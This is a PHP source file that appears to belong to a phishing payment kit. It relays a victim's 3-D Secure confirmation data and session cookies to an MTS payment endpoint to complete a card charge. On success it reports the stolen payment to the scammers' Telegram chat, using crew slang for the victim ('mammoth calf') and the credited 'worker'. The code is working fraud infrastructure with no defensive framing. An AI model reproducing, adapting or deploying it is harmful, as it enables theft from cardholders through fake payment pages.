<?php

/* */
require_once(__DIR__ . DIRECTORY_SEPARATOR . 'additionally.php');
require_once(__DIR__ . DIRECTORY_SEPARATOR . 'telegram.php');

/* */
$P_CONFIG = parse_ini_file(realpath('../config/index.ini'), true);

/* */
if(
	is_null(
		$temp = json_decode(
			@file_get_contents(
				realpath('./temp') . DIRECTORY_SEPARATOR . (isset($_POST['MD']) ? $_POST['MD'] : NULL)
			)
		)
	)
) {
	header('Location: ' . $P_CONFIG['URLS']['ERROR'] . '?exception=Произошла ошибка при проверке платежа. Указанный платеж не найден.');
}

/* */
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://payment.mts.ru/verified3ds?MdOrder={$_POST['MD']}&MD={$_POST['MD']}&type=2&referer=3");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));

if(isset($P_PROXY) && preg_match('/^(.*):(.*)$/', $P_PROXY)) 
{
	curl_setopt($ch, CURLOPT_PROXY, $P_PROXY);
	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTPS);

	if(preg_match('/^(.*):(.*)$/', $P_PROXYUSERPWD)) 
	{
		curl_setopt($ch, CURLOPT_PROXYUSERPWD, $P_PROXYUSERPWD);
	}
}

curl_setopt($ch, CURLOPT_HTTPHEADER, [
	'Cookie: ' . $temp->cookies,
	'Host: payment.mts.ru',
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36',
]);

if(is_bool($data = curl_exec($ch)) && !$data) {
	header('Location: ' . $P_CONFIG['URLS']['ERROR'] . '?exception=' . (curl_error($ch) . ' - ' . json_encode($data)));
}

curl_close($ch);

/* */
if(preg_match('/success/', $data)) {
	try {
		/* */
		$MESSAGE = '🚸 Кушаем 🚸' . PHP_EOL;
		$MESSAGE .= '🔸 Мамонтёнок оплатил услугу 🔸' . PHP_EOL;
		$MESSAGE .= '▪️ ALI ▪️' . PHP_EOL . PHP_EOL;
		$MESSAGE .= '💲 Сумма платежа 💲: ' . number_format($temp->amount, 0, "", " ") . ',00 ₽. Принят на карту: ' . $temp->r . PHP_EOL;
		$MESSAGE .= '▪️ Работяга ▪️: ' . $temp->username . PHP_EOL;
		$MESSAGE .= '🕙 Дата и время 🕙: ' . date('d.m.Y - H:i:s', time());

		/* */
		(new TG($P_CONFIG['TELEGRAM']))->sendMessage($P_CONFIG['TELEGRAM']['ADMIN_CHAT_ID'], $MESSAGE);
	}
	catch(Exception $e) {
		file_put_contents((realpath('./temp') . DIRECTORY_SEPARATOR . 'TELEGRAM-EXCEPTIONS.txt'), ($e->getMessage() . PHP_EOL), FILE_APPEND);
	}
	header('Location: ' . $P_CONFIG['URLS']['SUCCESS']);
}
else
{
	header('Location: ' . $P_CONFIG['URLS']['ERROR'] . '?exception=Произошла ошибка при оплате, попробуйте еще раз.');
}